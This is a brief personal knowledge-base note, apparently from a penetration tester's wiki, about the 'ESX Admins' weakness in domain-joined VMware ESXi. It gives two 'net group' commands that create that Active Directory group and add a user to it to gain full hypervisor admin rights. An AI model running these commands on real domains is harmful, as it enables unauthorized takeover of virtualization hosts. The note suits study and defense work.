---
tags:
  - virtualization
---
A paid solution to virtualization
# ESX Admins Vulnerability
For [[Windows Active Directory]] servers.
Creating a user group and adding a user to the group named "ESX Admins" grants users full administrative permissions.
Can be added with:
```
net group “ESX Admins” /domain /add
net group “ESX Admins” username /domain /add
```
